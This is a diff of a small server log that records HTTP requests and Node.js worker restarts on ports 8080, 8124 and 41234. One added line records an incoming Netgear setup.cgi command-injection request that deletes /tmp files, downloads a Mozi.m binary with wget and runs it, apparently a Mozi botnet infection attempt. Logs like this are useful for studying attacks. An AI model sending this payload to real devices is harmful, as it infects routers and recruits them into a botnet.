@@ -39,3 +39,18 @@ Wed Aug 18 2021 19:44:16 GMT+0800 (HKT) HTTP ::ffff:47.241.185.192:47054 GET htt
 
 Wed Aug 18 2021 20:04:03 GMT+0800 (HKT) HTTP ::ffff:41.215.92.174:33652 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36","Content-Length","0"]
 
+Wed Aug 18 2021 20:36:47 GMT+0800 (HKT) HTTP ::ffff:120.86.254.181:4951 GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 []
+
+worker 7259 died
+Worker 13861 started
+tcp server listening { port: 8124, family: 'IPv6', address: '::' }
+http listening :::8080
+udp listening 0.0.0.0:41234
+Master 13873 is running
+Worker 13879 started
+tcp server listening { port: 8124, family: 'IPv6', address: '::' }
+http listening :::8080
+udp listening 0.0.0.0:41234
+Wed Aug 18 2021 20:49:40 GMT+0800 (HKT) UDP 127.0.0.1:53737 client data str test
+
+Wed Aug 18 2021 20:49:40 GMT+0800 (HKT) UDP 127.0.0.1:53737 client data buf 746573740a
